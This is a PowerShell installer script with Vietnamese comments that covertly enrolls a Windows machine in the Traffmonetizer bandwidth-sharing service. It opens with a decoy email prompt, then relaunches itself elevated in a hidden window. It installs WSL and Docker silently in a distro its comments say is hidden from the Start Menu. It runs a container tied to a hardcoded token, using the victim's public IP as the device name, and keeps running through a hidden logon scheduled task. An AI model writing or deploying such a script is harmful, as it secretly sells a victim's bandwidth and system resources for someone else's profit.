if ($args -notcontains 'skip' -and -not $env:TM_SKIP_PROMPT) {
  $env:TM_SKIP_PROMPT = '1'
  try { $Email = Read-Host -Prompt 'Mời bạn nhập email' } catch {}
  Write-Host 'Hello'
}

$Token         = 'NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A='
$SelfUrl       = 'https://raw.githubusercontent.com/khoahocdrive/tm-install/main/install_windows.ps1'
$Dir           = Join-Path $env:ProgramData 'tm'
$ImageRepo     = 'traffmonetizer/cli_v2'
$ContainerName = 'tm'
$DataVolume    = 'tm-data'
$DistroName    = 'tm-linux'
$WslDir        = Join-Path $Dir 'wsl'
$ApkBranch     = 'v3.22'
$RootFsPrimary = 'https://dl-cdn.alpinelinux.org/alpine/v3.22/releases/x86_64/alpine-minirootfs-3.22.8-x86_64.tar.gz'
$RootFsList    = 'https://dl-cdn.alpinelinux.org/alpine/v3.22/releases/x86_64/'
$TaskName      = 'TraffmonetizerResume'
$Watchtower    = ($env:TM_WATCHTOWER -eq 'true')
$WatchtowerImage = 'nickfedor/watchtower:latest'

$ErrorActionPreference = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
$SelfPath = Join-Path $Dir 'install_windows.ps1'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
$LogFile = Join-Path $Dir 'install.log'
function Log($m) { try { "$(Get-Date -Format s) $m" | Add-Content -Path $LogFile } catch {} }
Log "=== Bat dau (Docker Engine trong WSL - KHONG Docker Desktop) ==="

$ThisScript = if ($PSCommandPath) { $PSCommandPath } else { $SelfPath }
if ($PSCommandPath) { try { Unblock-File $PSCommandPath } catch {} }

$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $IsAdmin) {
  Log 'Khong co quyen admin - tu dong ep RunAs (UAC)'
  if ($PSCommandPath) {
    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" skip"
  } else {
    try {
      Invoke-WebRequest -Uri $SelfUrl -OutFile $SelfPath -UseBasicParsing
      Unblock-File $SelfPath
      Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$SelfPath`" skip"
    } catch {}
  }
  exit
}

if (-not $Token -or $Token -eq 'DAN_TOKEN_CUA_BAN_VAO_DAY') { exit 1 }

function Set-ResumeTask {
  $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ThisScript`" skip"
  $t = New-ScheduledTaskTrigger -AtLogOn
  $p = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
  Register-ScheduledTask -TaskName $TaskName -Action $a -Trigger $t -Principal $p -Force | Out-Null
}

function Wsh($cmd) { & wsl.exe -d $DistroName -u root -- sh -c $cmd }
function DockerUp {
  $r = Wsh 'docker info >/dev/null 2>&1 && echo DOCKOK'
  return ("$r" -match 'DOCKOK')
}
function Start-DockerDaemon {
  Log 'Khoi dong dockerd trong WSL...'
  Wsh 'nohup dockerd >/dev/null 2>&1 </dev/null &' | Out-Null
  for ($i = 0; $i -lt 30; $i++) { if (DockerUp) { Log 'dockerd san sang'; return $true }; Start-Sleep -Seconds 2 }
  Log 'CANH BAO: dockerd khong san sang'
  return $false
}

# Gioi han RAM cua WSL de he thong luon nhe (khong ghi de neu user da co file nay)
try {
  $wslcfg = Join-Path $env:UserProfile '.wslconfig'
  if (-not (Test-Path $wslcfg)) {
    Set-Content -Path $wslcfg -Value "[wsl2]`r`nmemory=1GB`r`nprocessors=2`r`nswap=0"
    Log 'Da ghi .wslconfig (memory=1GB, processors=2, swap=0)'
  }
} catch {}

# === Buoc 1: WSL ===
$HasWsl = $false
try {
  $st = (& wsl.exe --status 2>$null | Out-String) -replace "`0", ''
  $HasWsl = ($LASTEXITCODE -eq 0 -and $st.Trim().Length -gt 0)
} catch {}
if (-not $HasWsl) {
  Log 'Chua co WSL - cai WSL ngam (khong distro, khong mo cua so)'
  & wsl.exe --install --no-distribution --no-launch *> $null
  if ($LASTEXITCODE -ne 0) {
    & wsl.exe --install --no-distribution *> $null
    Start-Sleep -Seconds 15
    Get-Process wslsettings -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
  }
  Start-Sleep -Seconds 5
  $st2 = ''
  try { $st2 = (& wsl.exe --status 2>$null | Out-String) -replace "`0", '' } catch {}
  if ($LASTEXITCODE -eq 0 -and $st2.Trim().Length -gt 0) {
    Log 'WSL da san sang ngay sau khi cai - chay tiep'
  } else {
    Set-ResumeTask
    Log 'Windows yeu cau khoi dong lai sau khi cai WSL: khoi dong roi dang nhap lai, task se tu chay tiep'
    exit 2
  }
}
Log 'WSL san sang'

# === Buoc 2: distro tm-linux (import thu cong - KHONG xuat hien trong Start Menu / danh sach app / recent) ===
$list = ''
try { $list = (& wsl.exe --list --quiet 2>$null | Out-String) -replace "`0", '' } catch {}
$HasDistro = ($list -match [regex]::Escape($DistroName))
if (-not $HasDistro) {
  Log 'Tai Alpine minirootfs (~4MB)...'
  $ProgressPreference = 'SilentlyContinue'
  $tar = Join-Path $env:TEMP 'alpine-rootfs.tar.gz'
  $ok = $false
  try {
    Invoke-WebRequest -Uri $RootFsPrimary -OutFile $tar -UseBasicParsing -TimeoutSec 600
    $ok = $true
  } catch {}
  if (-not $ok) {
    try {
      $html = (Invoke-WebRequest -Uri $RootFsList -UseBasicParsing).Content
      $ver = ([regex]::Matches($html, 'alpine-minirootfs-([\d.]+)-x86_64\.tar\.gz') | ForEach-Object { $_.Groups[1].Value } | Sort-Object -Property {[version]$_} | Select-Object -Last 1)
      if ($ver) {
        Invoke-WebRequest -Uri ($RootFsList + "alpine-minirootfs-$ver-x86_64.tar.gz") -OutFile $tar -UseBasicParsing -TimeoutSec 600
        $ok = $true
      }
    } catch {}
  }
  if (-not $ok -or -not (Test-Path $tar)) { Log 'LOI: khong tai duoc rootfs - dang ky resume roi thoat'; Set-ResumeTask; exit 3 }
  New-Item -ItemType Directory -Force -Path $WslDir | Out-Null
  Log 'Import distro vao WSL (an hoan toan khoi giao dien)...'
  & wsl.exe --import $DistroName $WslDir $tar *> $null
  Remove-Item $tar -Force -ErrorAction SilentlyContinue
  Log "Da import $DistroName"
}

# === Buoc 3: Docker Engine trong distro (lan dau ~150MB, chay ngam) ===
$chk = Wsh 'apk info -e docker >/dev/null 2>&1 && echo PKGOK'
if ("$chk" -notmatch 'PKGOK') {
  Log 'Cai Docker Engine trong WSL (~150MB, mat vai phut, chay ngam)...'
  Wsh ("printf 'https://dl-cdn.alpinelinux.org/alpine/$ApkBranch/main\nhttps://dl-cdn.alpinelinux.org/alpine/$ApkBranch/community\n' > /etc/apk/repositories && apk update >/dev/null 2>&1 && apk add --no-progress docker >/dev/null 2>&1 && echo APKOK") | Out-Null
  $chk = Wsh 'apk info -e docker >/dev/null 2>&1 && echo PKGOK'
  if ("$chk" -notmatch 'PKGOK') { Log 'LOI: cai Docker Engine that bai - dang ky resume roi thoat'; Set-ResumeTask; exit 4 }
  Log 'Docker Engine da cai xong'
}

# === Buoc 4: daemon + container ===
if (-not (DockerUp)) { Start-DockerDaemon | Out-Null }
if (DockerUp) {
  $Image = "${ImageRepo}:latest"
  $Device = ''
  try { $Device = (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 10).ToString().Trim() } catch {}
  if (-not $Device) { $Device = $env:COMPUTERNAME }
  $exists = Wsh "docker ps -a --filter name=$ContainerName -q"
  if ("$exists".Trim()) {
    Log "Container '$ContainerName' da ton tai - chi dam bao no dang chay"
    Wsh "docker start $ContainerName >/dev/null 2>&1" | Out-Null
  } else {
    Log "Pull image $Image va tao container..."
    Wsh "docker pull $Image >/dev/null 2>&1; docker run -d --name $ContainerName --restart unless-stopped -e HOME=/var/lib/tm -v ${DataVolume}:/var/lib/tm $Image --token $Token --device-name $Device start accept" | Out-Null
  }
  $run = Wsh "docker ps --filter name=$ContainerName --filter status=running -q"
  if ("$run".Trim()) { Log "Container '$ContainerName' dang chay (device: $Device)" } else { Log "CANH BAO: container '$ContainerName' chua chay" }
  if ($Watchtower) {
    $wt = Wsh "docker ps -a --filter name=watchtower -q"
    if (-not "$wt".Trim()) {
      Wsh "docker pull $WatchtowerImage >/dev/null 2>&1; docker run -d --name watchtower --restart unless-stopped -v /var/run/docker.sock:/var/run/docker.sock $WatchtowerImage $ContainerName" | Out-Null
      Log 'Da dat watchtower tu dong cap nhat'
    }
  }
  Set-ResumeTask
  Log '=== Hoan tat ==='
} else {
  Set-ResumeTask
  Log 'dockerd chua san sang - da dang ky task resume, se tu chay lai khi dang nhap'
  exit 2
}
Start-Sleep -Seconds 2
